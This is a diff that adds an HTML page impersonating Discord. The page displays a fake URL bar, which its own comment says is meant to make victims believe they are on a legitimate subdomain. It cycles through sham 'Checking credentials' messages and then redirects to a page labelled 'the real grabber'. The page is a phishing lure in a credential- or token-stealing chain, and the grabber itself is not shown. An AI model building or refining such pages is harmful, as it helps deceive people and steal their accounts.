@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        body {
+            background-color: #36393f;
+            color: #dcddde;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .loader {
+            border: 4px solid #2f3136;
+            border-top: 4px solid #7289da;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        .text {
+            font-size: 14px;
+            color: #b9bbbe;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .fake-url {
+            background-color: #2f3136;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #80848e;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- This makes it LOOK like they are on a 443 subdomain -->
+    <div class="fake-url">https://test443loginiddiscord.https/verify</div>
+
+    <div class="loader"></div>
+    <div class="text" id="status">Connecting to 443...</div>
+
+    <script>
+        const statusEl = document.getElementById('status');
+        const steps = [
+            "Connecting to 443...",
+            "Checking credentials...",
+            "Connected to 443",
+            "Syncing client..."
+        ];
+        
+        let step = 0;
+        const interval = setInterval(() => {
+            if (step < steps.length) {
+                statusEl.innerText = steps[step];
+                step++;
+            } else {
+                clearInterval(interval);
+                // REDIRECT TO THE REAL GRABBER
+                window.location.href = "grabber.html";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
